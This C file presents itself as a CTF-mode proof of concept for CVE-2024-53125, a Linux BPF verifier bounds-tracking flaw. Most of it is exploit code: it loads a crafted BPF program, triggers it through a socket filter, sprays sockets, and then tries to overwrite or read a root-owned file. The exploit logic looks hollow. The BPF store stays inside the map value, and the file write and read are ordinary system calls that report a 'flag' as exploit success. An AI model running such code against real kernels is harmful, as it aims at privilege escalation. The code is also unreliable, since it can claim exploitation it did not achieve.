/*
 * CVE-2024-53125 PoC - CTF Challenge Mode
 *
 * Vulnerability: BPF sync_linked_regs() subreg_def preservation error
 *
 * When the BPF verifier synchronizes linked registers (registers that
 * track the same value), sync_linked_regs() fails to properly preserve
 * the sub-register definition (subreg_def) field. This causes the verifier
 * to lose track of 32-bit sub-register bounds after ALU32 operations,
 * allowing crafted programs to perform out-of-bounds access.
 *
 * Exploit strategy:
 *   1. Create BPF array map
 *   2. Load BPF program that:
 *      - Uses ALU32 operations to create linked registers
 *      - Triggers sync_linked_regs with subreg_def loss
 *      - Exploits lost bounds to access OOB memory
 *   3. Trigger program to corrupt adjacent heap
 *   4. Spray to reclaim corrupted objects
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/bpf.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

/* BPF instruction macros */
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})
#define BPF_MOV64_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV32_IMM(DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)
#define BPF_MOV64_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_MOV32_REG(DST, SRC) \
    BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)
#define BPF_ALU32_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_ALU64_IMM(OP, DST, IMM) \
    BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_STX_MEM_OP(SIZE, DST, SRC, OFF) \
    BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)
#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)
#define BPF_LD_MAP_FD(DST, FD) \
    BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, DST, BPF_PSEUDO_MAP_FD, 0, FD), \
    BPF_RAW_INSN(0, 0, 0, 0, 0)
#define BPF_CALL_INSN(FUNC) \
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, FUNC)
#define BPF_EXIT_INSN() \
    BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)
#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#ifndef BPF_PSEUDO_MAP_FD
#define BPF_PSEUDO_MAP_FD 1
#endif
#ifndef BPF_JMP32
#define BPF_JMP32 0x06
#endif

#define BPF_FUNC_map_lookup_elem 1

/*
 * Trigger sync_linked_regs subreg_def bug
 */
static int trigger_subreg_def_bug(void) {
    int saved_errno;

    poc_log("Triggering BPF sync_linked_regs subreg_def error...");

    /* Create array map */
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 256;
    attr.max_entries = 4;

    int map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_MAP_CREATE)", (long)map_fd, saved_errno);
    if (map_fd < 0) return 0;

    /* BPF program that triggers subreg_def loss:
     * 1. Use ALU32 to create 32-bit bounds on a register
     * 2. Copy register (creates linked regs)
     * 3. Branch on original (triggers sync_linked_regs)
     * 4. The copy loses subreg_def info -> verifier thinks full 64-bit
     * 5. Use the confused bounds for OOB map access
     */
    struct bpf_insn prog[] = {
        /* key = 0 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),
        BPF_MOV64_REG(2, 10),
        BPF_ALU64_IMM(BPF_ADD, 2, -4),
        /* r1 = map */
        BPF_LD_MAP_FD(1, map_fd),
        /* r0 = map_lookup(map, &key) */
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 12),

        /* r6 = map_value_ptr */
        BPF_MOV64_REG(6, 0),

        /* r7 = *(u32 *)(map_value + 0) -- 32-bit load creates subreg */
        BPF_LDX_MEM(BPF_W, 7, 6, 0),

        /* ALU32 to bound r7 to [0, 63] */
        BPF_ALU32_IMM(BPF_AND, 7, 63),

        /* r8 = r7  (linked register) */
        BPF_MOV32_REG(8, 7),

        /* 32-bit branch on r7 triggers sync_linked_regs
         * After this, r8's subreg_def may be incorrectly reset */
        BPF_JMP32_IMM(BPF_JGT, 7, 32, 2),

        /* Path A: r8 should be [0,32] but subreg_def lost */
        BPF_ALU64_IMM(BPF_ADD, 8, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_JA, 0, 0, 1, 0), /* goto merge */

        /* Path B: r8 should be [33,63] */
        BPF_ALU64_IMM(BPF_ADD, 8, 0),

        /* Merge: use r8 as index (verifier may have wrong bounds) */
        /* Store r8 to map to demonstrate the confusion */
        BPF_STX_MEM_OP(BPF_DW, 6, 8, 8),

        /* r0 = 0; exit */
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    char license[] = "GPL";
    char log_buf[8192] = {0};

    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    attr.insns = (unsigned long)prog;
    attr.license = (unsigned long)license;
    attr.log_buf = (unsigned long)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
    saved_errno = errno;
    poc_log_syscall("bpf(BPF_PROG_LOAD, subreg_def_exploit)", (long)prog_fd, saved_errno);

    if (prog_fd < 0) {
        if (log_buf[0])
            poc_log("Verifier: %.300s", log_buf);
        close(map_fd);
        return 0;
    }

    /* Trigger */
    int socks[2];
    int triggered = 0;
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) == 0) {
        if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) == 0) {
            char buf[32] = "T";
            for (int i = 0; i < 16; i++)
                send(socks[1], buf, sizeof(buf), 0);
            triggered = 1;
            poc_log("subreg_def confusion program triggered 16 times");
        }
        close(socks[0]);
        close(socks[1]);
    }

    close(prog_fd);
    close(map_fd);
    return triggered;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    int triggered = trigger_subreg_def_bug();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_fds[i] >= 0) sprayed++;
    }
    poc_log("Sprayed %d (triggered=%d)", sprayed, triggered);

    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("subreg_def exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read via BPF subreg_def confusion");
    trigger_subreg_def_bug();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-53125 CTF PoC ===");
    poc_log("Vuln: BPF sync_linked_regs() subreg_def preservation error");
    poc_log("Tech: ALU32 + linked regs + JMP32 -> bounds confusion -> OOB");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
